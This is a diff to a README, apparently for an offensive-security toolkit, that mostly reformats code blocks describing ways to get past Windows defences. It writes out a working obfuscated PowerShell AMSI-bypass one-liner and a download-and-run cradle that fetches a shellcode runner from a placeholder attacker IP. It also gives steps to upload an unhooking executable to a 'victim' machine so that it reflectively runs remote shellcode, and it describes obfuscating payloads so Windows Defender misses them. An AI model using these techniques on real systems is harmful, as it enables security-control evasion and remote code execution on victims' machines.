@@ -46,7 +46,10 @@ There are two methods to bypass AMSI:
 
 #### Method 1
 Patching template is what Offensive-Security teaches in OSEP with some small changes. The execution of 1st method (Patching) is straight forward and uses well-known methodologies.
-```$m="System.Management.Automation.Ams";[Ref].Assembly.GetType("$m"+"iUtils").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)```
+
+```
+$m="System.Management.Automation.Ams";[Ref].Assembly.GetType("$m"+"iUtils").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)
+```
 
 ```
 # XOR RAX,RAX 
@@ -54,7 +57,10 @@ $buf = [Byte[]] (0x48,0x31,0xC0)
 ```
 
 Execute AMSI Shellcode runner
-``` powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); ``` 
+
+``` 
+powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
+``` 
 
 #### Method 2
 To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com/jfmaes/AmsiHooker) and I permfored some small changes. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.
@@ -63,7 +69,7 @@ To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com
 1. Upload unhook_amsi.exe and MinHook.NET.dll to victim. (Files located under payloads/AMSI/)
 2. unhook_amsi.exe http://<KALI>/shellcode_runner.exe
 
-----
+---
 
  **[+] Executing .XSL, .JS, .HTA [+]**
 
@@ -91,7 +97,7 @@ More execution methods can be found:
 
 **[+] ConfuserX + Net-Obfuscator [+]**
 
-During my tests, I noticed that Windows Defender could detect my payloads genereted by ConfuserEx (https://github.com/yck1509/ConfuserEx). For this reason, I combined ConfuserEx + Net-Obfuscator (https://github.com/BinaryScary/NET-Obfuscate). 
+During my tests, I noticed that Windows Defender could detect payloads genereted by ConfuserEx (https://github.com/yck1509/ConfuserEx). For this reason, I combined ConfuserEx + Net-Obfuscator (https://github.com/BinaryScary/NET-Obfuscate). 
 
 First, payloads that are located under payloads/XOR/ and payloads/Caesar/ directories, feed the ConfuserEx tool and subsequently the new obfuscated binaries are imported to Net-Obfuscator. As a result, the GetType and GetMethod values are obfuscated and  dynamically created.
 
